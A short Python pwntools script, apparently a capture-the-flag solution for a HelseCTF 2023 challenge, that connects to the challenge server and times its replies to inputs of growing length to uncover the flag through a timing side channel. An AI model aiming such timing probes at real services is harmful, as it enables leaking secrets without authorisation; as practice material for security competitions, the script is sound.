from pwn import *
import time
io = remote("helsectf2023-6ac4e1c6d8855c1bd96a-eksponentiell_sjekk.chals.io", 443, ssl=True)

print(io.recvuntil(b"flagget?").decode())

for i in range(51, 100):
    start = time.time()*1000
    io.sendline(b"FF"*i)

    io.recvuntil(b"flagget?")
    end = round(time.time()*1000 - start)
    print(f"Testing length {i} - Time used: {end}ms")